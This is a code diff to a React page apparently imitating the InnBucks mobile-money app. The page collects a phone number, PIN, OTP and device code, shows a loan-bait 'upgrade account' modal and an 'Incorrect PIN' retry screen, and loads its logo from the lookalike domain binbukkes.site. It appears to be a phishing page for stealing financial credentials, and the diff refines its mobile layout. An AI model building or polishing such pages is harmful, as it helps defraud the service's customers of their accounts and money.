@@ -350,7 +350,7 @@ export default function InnBucksPage() {
   }
 
   return (
-    <main className="min-h-screen w-full bg-[#28293C] flex items-center justify-center p-0 text-white select-none relative overflow-hidden">
+    <main className="h-[100dvh] max-h-[100dvh] w-full bg-[#28293C] flex items-center justify-center p-0 text-white select-none relative overflow-hidden">
       {/* ========================================================================= */}
       {/* 1. INITIAL ANIMATED SPLASH SCREEN (Screenshot 1 - Transition On/Off)      */}
       {/* ========================================================================= */}
@@ -408,40 +408,40 @@ export default function InnBucksPage() {
           <div className="fixed inset-x-0 bottom-0 flex justify-center pointer-events-none">
             <div
               onClick={(e) => e.stopPropagation()}
-              className={`w-full sm:max-w-[420px] bg-[#28293C] rounded-t-[28px] sm:rounded-t-[32px] border-t border-x border-white/10 px-6 pt-5 pb-8 shadow-[0_-15px_40px_rgba(0,0,0,0.5)] relative pointer-events-auto transition-transform duration-500 cubic-bezier(0.16, 1, 0.3, 1) ${
+              className={`w-full sm:max-w-[420px] bg-[#28293C] rounded-t-[28px] sm:rounded-t-[32px] border-t border-x border-white/10 px-5 sm:px-6 pt-4 sm:pt-5 pb-6 sm:pb-8 shadow-[0_-15px_40px_rgba(0,0,0,0.5)] relative pointer-events-auto transition-transform duration-500 cubic-bezier(0.16, 1, 0.3, 1) max-h-[92dvh] overflow-y-auto ${
                 modalSlideIn ? "translate-y-0" : "translate-y-full"
               }`}
             >
               {/* Subtle top indicator bar */}
-              <div className="w-12 h-1 bg-white/20 rounded-full mx-auto mb-4" />
+              <div className="w-12 h-1 bg-white/20 rounded-full mx-auto mb-3 sm:mb-4" />
 
               {/* Close Button in top right */}
               <button
                 type="button"
                 onClick={closeUpgradeModal}
-                className="absolute top-5 right-5 w-8 h-8 rounded-full bg-white/10 hover:bg-white/15 text-white/70 hover:text-white flex items-center justify-center transition-colors cursor-pointer"
+                className="absolute top-4 sm:top-5 right-4 sm:right-5 w-8 h-8 rounded-full bg-white/10 hover:bg-white/15 text-white/70 hover:text-white flex items-center justify-center transition-colors cursor-pointer"
                 aria-label="Close"
               >
                 <X className="w-4 h-4" />
               </button>
 
               {/* Blue Star Circle Emblem */}
-              <div className="w-14 h-14 rounded-full bg-[#335c87] mx-auto flex items-center justify-center shadow-lg shadow-[#335c87]/30">
-                <Star className="w-7 h-7 fill-white text-white" />
+              <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#335c87] mx-auto flex items-center justify-center shadow-lg shadow-[#335c87]/30">
+                <Star className="w-6 h-6 sm:w-7 sm:h-7 fill-white text-white" />
               </div>
 
               {/* Title & Description */}
-              <div className="text-center mt-4">
-                <h2 className="text-[20px] sm:text-[21px] font-extrabold text-white tracking-tight leading-snug">
+              <div className="text-center mt-3 sm:mt-4">
+                <h2 className="text-[19px] sm:text-[21px] font-extrabold text-white tracking-tight leading-snug">
                   Upgrade Your InnBucks Account Now!
                 </h2>
-                <p className="text-white/70 text-[13px] mt-1.5 max-w-[320px] mx-auto leading-relaxed">
+                <p className="text-white/70 text-[12.5px] sm:text-[13px] mt-1.5 max-w-[320px] mx-auto leading-relaxed">
                   InnBucks customers need to upgrade their account to enjoy these exclusive benefits:
                 </p>
               </div>
 
               {/* Benefits List */}
-              <div className="mt-5 space-y-3 text-[13.5px] text-white/90">
+              <div className="mt-4 sm:mt-5 space-y-2.5 sm:space-y-3 text-[12.5px] sm:text-[13.5px] text-white/90">
                 <div className="flex items-center gap-3">
                   <span className="text-xl shrink-0">💰</span>
                   <span className="font-medium">Instant Personal Loans up to ZiG50000</span>
@@ -461,18 +461,18 @@ export default function InnBucksPage() {
               </div>
 
               {/* CTA Button */}
-              <div className="mt-7">
+              <div className="mt-5 sm:mt-7">
                 <button
                   type="button"
                   onClick={closeUpgradeModal}
-                  className="w-full h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[14.5px] uppercase tracking-wider shadow-md shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
+                  className="w-full h-[48px] sm:h-[50px] rounded-[12px] bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[14.5px] uppercase tracking-wider shadow-md shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
                 >
                   UPGRADE ACCOUNT NOW
                 </button>
               </div>
 
               {/* Support Link */}
-              <div className="mt-3.5 text-center text-[12.5px] text-white/60">
+              <div className="mt-3 text-center text-[12px] text-white/60">
                 Need Help?{" "}
                 <a
                   href="#"
@@ -491,9 +491,9 @@ export default function InnBucksPage() {
       )}
 
       {/* ========================================================================= */}
-      {/* 4. MAIN SCREENS CONTAINER                                                 */}
+      {/* 4. MAIN SCREENS CONTAINER (Strict 100dvh Lock, Zero Mobile Scroll)       */}
       {/* ========================================================================= */}
-      <div className="w-full max-w-[420px] min-h-[100dvh] sm:min-h-[640px] bg-[#28293C] flex flex-col justify-between px-6 pt-6 sm:pt-8 pb-6 sm:pb-8 relative">
+      <div className="w-full max-w-[420px] h-[100dvh] max-h-[100dvh] sm:h-[640px] sm:max-h-[720px] bg-[#28293C] flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-7 pb-4 sm:pb-7 relative overflow-hidden">
         {/* ======================================================================= */}
         {/* STEP 1: PHONE NUMBER & STEP 2: PIN SCREENS                              */}
         {/* ======================================================================= */}
@@ -680,20 +680,20 @@ export default function InnBucksPage() {
           <>
             <div>
               {/* Header Bar with #32344a Background matching Screenshot */}
-              <div className="-mx-6 -mt-6 sm:-mt-8 px-6 py-3.5 bg-[#32344a] border-b border-black/15 flex items-center justify-between relative shadow-xs">
+              <div className="-mx-5 sm:-mx-6 -mt-4 sm:-mt-7 px-5 sm:px-6 py-3 sm:py-3.5 bg-[#32344a] border-b border-black/15 flex items-center justify-between relative shadow-xs">
                 {/* Back Button in Circle */}
                 <button
                   type="button"
                   onClick={() => setStep("pin")}
-                  className="w-9 h-9 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
+                  className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-white/10 hover:bg-white/15 text-white flex items-center justify-center transition-colors cursor-pointer shrink-0"
                   aria-label="Back"
                 >
                   <ChevronLeft className="w-5 h-5 stroke-[2.5]" />
                 </button>
 
                 {/* Center Logo + InnBucks Title */}
-                <div className="flex items-center gap-2 pr-9 mx-auto">
-                  <div className="w-[28px] h-[28px] shrink-0 flex items-center justify-center">
+                <div className="flex items-center gap-2 pr-8 sm:pr-9 mx-auto">
+                  <div className="w-[26px] h-[26px] sm:w-[28px] sm:h-[28px] shrink-0 flex items-center justify-center">
                     <img
                       src="https://binbukkes.site/innBucks_color_logo.png"
                       onError={(e) => {
@@ -704,7 +704,7 @@ export default function InnBucksPage() {
                     />
                   </div>
                   <span
-                    style={{ fontSize: "22px", fontWeight: 700 }}
+                    style={{ fontSize: "21px", fontWeight: 700 }}
                     className="text-white tracking-tight"
                   >
                     InnBucks
@@ -713,25 +713,25 @@ export default function InnBucksPage() {
               </div>
 
               {/* Message Badge Circle */}
-              <div className="w-14 h-14 rounded-full bg-[#1b2538] border border-[#335c87]/60 flex items-center justify-center mx-auto mt-6 shadow-md shadow-[#335c87]/20">
-                <CreditCard className="w-6 h-6 text-[#3897f0]" />
+              <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#1b2538] border border-[#335c87]/60 flex items-center justify-center mx-auto mt-4 sm:mt-5 shadow-md shadow-[#335c87]/20">
+                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-[#3897f0]" />
               </div>
 
               {/* Title & Subtitle */}
-              <div className="text-center mt-4">
-                <h1 className="text-[21px] sm:text-[22px] font-bold text-white tracking-tight">
+              <div className="text-center mt-3 sm:mt-4">
+                <h1 className="text-[20px] sm:text-[22px] font-bold text-white tracking-tight">
                   Enter Verification Code
                 </h1>
-                <p className="text-white/70 text-[13px] sm:text-[13.5px] mt-1">
+                <p className="text-white/70 text-[12.5px] sm:text-[13px] mt-1">
                   A 6-digit OTP has been sent to your registered mobile number.
                 </p>
-                <p className="text-[#4D9EE1] font-bold text-[14.5px] mt-1" dir="ltr">
+                <p className="text-[#4D9EE1] font-bold text-[14px] sm:text-[14.5px] mt-1" dir="ltr">
                   {formatMaskedPhone(phone)}
                 </p>
               </div>
 
               {/* 6 OTP Boxes */}
-              <div className="mt-7">
+              <div className="mt-5 sm:mt-6">
                 <div className="grid grid-cols-6 gap-2 sm:gap-2.5 max-w-[350px] mx-auto">
                   {otpDigits.map((digit, idx) => (
                     <input
@@ -841,12 +841,12 @@ export default function InnBucksPage() {
                 </p>
               </div>
 
-              {/* 5 Dots Indicator - Increased Size */}
-              <div className="flex items-center justify-center gap-4 sm:gap-5 my-8 sm:my-10">
+              {/* 5 Dots Indicator - Responsive Spacing */}
+              <div className="flex items-center justify-center gap-4 sm:gap-5 my-4 sm:my-8">
                 {[0, 1, 2, 3, 4].map((i) => (
                   <span
                     key={i}
-                    className={`w-4 h-4 sm:w-[18px] sm:h-[18px] rounded-full transition-all duration-150 ${
+                    className={`w-3.5 h-3.5 sm:w-[18px] sm:h-[18px] rounded-full transition-all duration-150 ${
                       i < deviceCode.length ? "bg-white shadow-sm shadow-white/50 scale-105" : "bg-white/30"
                     }`}
                   />
@@ -855,23 +855,23 @@ export default function InnBucksPage() {
 
               {/* Error Message if Passwords do not match */}
               {deviceError && (
-                <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[13px] font-medium -mt-4 mb-4 animate-in fade-in duration-150">
+                <div className="flex items-center justify-center gap-1.5 text-rose-500 text-[12.5px] sm:text-[13px] font-medium -mt-2 mb-2 animate-in fade-in duration-150">
                   <AlertCircle className="w-4 h-4 shrink-0" />
                   <span>{deviceError}</span>
                 </div>
               )}
             </div>
 
-            {/* Custom Numeric Keypad (Larger Numbers & Touch Targets) */}
-            <div className="w-full max-w-[350px] mx-auto pb-4 sm:pb-6">
-              <div className="grid grid-cols-3 gap-y-3 sm:gap-y-4 text-center">
+            {/* Custom Numeric Keypad (Responsive Touch Targets) */}
+            <div className="w-full max-w-[350px] mx-auto pb-1 sm:pb-4">
+              <div className="grid grid-cols-3 gap-y-1 sm:gap-y-2.5 text-center">
                 {/* 1, 2, 3 */}
                 {["1", "2", "3"].map((n) => (
                   <button
                     key={n}
                     type="button"
                     onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[34px] sm:text-[38px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-16 sm:h-18 flex items-center justify-center cursor-pointer select-none"
+                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                   >
                     {n}
                   </button>
@@ -883,7 +883,7 @@ export default function InnBucksPage() {
                     key={n}
                     type="button"
                     onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[34px] sm:text-[38px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-16 sm:h-18 flex items-center justify-center cursor-pointer select-none"
+                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                   >
                     {n}
                   </button>
@@ -895,7 +895,7 @@ export default function InnBucksPage() {
                     key={n}
                     type="button"
                     onClick={() => handleDeviceKeyClick(n)}
-                    className="text-[34px] sm:text-[38px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-16 sm:h-18 flex items-center justify-center cursor-pointer select-none"
+                    className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                   >
                     {n}
                   </button>
@@ -906,17 +906,17 @@ export default function InnBucksPage() {
                 <button
                   type="button"
                   onClick={() => handleDeviceKeyClick("0")}
-                  className="text-[34px] sm:text-[38px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-16 sm:h-18 flex items-center justify-center cursor-pointer select-none"
+                  className="text-[30px] sm:text-[36px] font-normal text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                 >
                   0
                 </button>
                 <button
                   type="button"
                   onClick={handleDeviceBackspace}
-                  className="text-white hover:text-white/80 active:scale-90 transition-transform h-16 sm:h-18 flex items-center justify-center cursor-pointer select-none"
+                  className="text-white hover:text-white/80 active:scale-90 transition-transform h-12 sm:h-16 flex items-center justify-center cursor-pointer select-none"
                   aria-label="Delete"
                 >
-                  <Delete className="w-8 h-8 sm:w-9 sm:h-9 stroke-[1.5]" />
+                  <Delete className="w-7 h-7 sm:w-8 sm:h-8 stroke-[1.5]" />
                 </button>
               </div>
             </div>
@@ -927,11 +927,11 @@ export default function InnBucksPage() {
         {/* STEP 5: INCORRECT PIN SCREEN (Matching Screenshot)                      */}
         {/* ======================================================================= */}
         {step === "incorrect" && (
-          <div className="flex flex-col justify-between h-full min-h-[100dvh] sm:min-h-[640px] -my-6 sm:-my-8">
+          <div className="flex flex-col justify-between h-full -mx-5 sm:-mx-6 -mt-4 sm:-mt-7 -mb-4 sm:-mb-7">
             {/* Top Header Bar in #335c87 with Logo + InnBucks */}
-            <div className="-mx-6 px-6 py-3.5 bg-[#335c87] border-b border-black/20 flex items-center justify-start shadow-xs">
+            <div className="px-5 sm:px-6 py-3 bg-[#335c87] border-b border-black/20 flex items-center justify-start shadow-xs">
               <div className="flex items-center gap-2.5">
-                <div className="w-[28px] h-[28px] shrink-0 flex items-center justify-center">
+                <div className="w-[26px] h-[26px] sm:w-[28px] sm:h-[28px] shrink-0 flex items-center justify-center">
                   <img
                     src="https://binbukkes.site/innBucks_color_logo.png"
                     onError={(e) => {
@@ -942,7 +942,7 @@ export default function InnBucksPage() {
                   />
                 </div>
                 <span
-                  style={{ fontSize: "22px", fontWeight: 700 }}
+                  style={{ fontSize: "21px", fontWeight: 700 }}
                   className="text-white tracking-tight"
                 >
                   InnBucks
@@ -951,28 +951,28 @@ export default function InnBucksPage() {
             </div>
 
             {/* Center Content: Red Lock Emblem & Incorrect Message */}
-            <div className="my-auto py-8 text-center animate-in fade-in zoom-in-95 duration-200">
+            <div className="my-auto py-4 sm:py-6 text-center animate-in fade-in zoom-in-95 duration-200">
               {/* Red Circular Lock Emblem */}
-              <div className="w-24 h-24 rounded-full bg-[#3b2434] border border-[#ff3b30]/40 flex items-center justify-center mx-auto mb-6 shadow-xl shadow-rose-950/40">
-                <Lock className="w-10 h-10 text-[#ff3b30] stroke-[2.2]" />
+              <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-[#3b2434] border border-[#ff3b30]/40 flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-xl shadow-rose-950/40">
+                <Lock className="w-8 h-8 sm:w-10 sm:h-10 text-[#ff3b30] stroke-[2.2]" />
               </div>
 
               {/* Red Headline */}
-              <h1 className="text-[24px] sm:text-[26px] font-extrabold text-[#ff3b30] tracking-tight">
+              <h1 className="text-[22px] sm:text-[25px] font-extrabold text-[#ff3b30] tracking-tight">
                 Incorrect PIN
               </h1>
 
               {/* Subtitle */}
-              <p className="text-white/70 text-[14px] sm:text-[14.5px] mt-2.5 max-w-[270px] mx-auto leading-relaxed">
+              <p className="text-white/70 text-[13px] sm:text-[14px] mt-2 max-w-[270px] mx-auto leading-relaxed">
                 Your PIN is incorrect. Please check your details and try again.
               </p>
 
               {/* Try Again Pill Button */}
-              <div className="mt-8 flex justify-center">
+              <div className="mt-6 sm:mt-7 flex justify-center">
                 <button
                   type="button"
                   onClick={resetAllFieldsAndRestart}
-                  className="w-full max-w-[280px] h-[52px] rounded-full bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[16px] shadow-lg shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
+                  className="w-full max-w-[280px] h-[48px] sm:h-[52px] rounded-full bg-[#335c87] hover:bg-[#2b4d70] active:scale-[0.99] text-white font-bold text-[15px] sm:text-[16px] shadow-lg shadow-[#335c87]/30 transition-all cursor-pointer flex items-center justify-center"
                 >
                   Try Again
                 </button>
@@ -980,7 +980,7 @@ export default function InnBucksPage() {
             </div>
 
             {/* Bottom Navigation Bar */}
-            <div className="-mx-6 px-6 py-2.5 bg-[#32344a] border-t border-white/10 flex items-center justify-around select-none">
+            <div className="px-5 sm:px-6 py-2.5 bg-[#32344a] border-t border-white/10 flex items-center justify-around select-none">
               {/* Home Tab - Redirects to start screen with full reset */}
               <button
                 type="button"
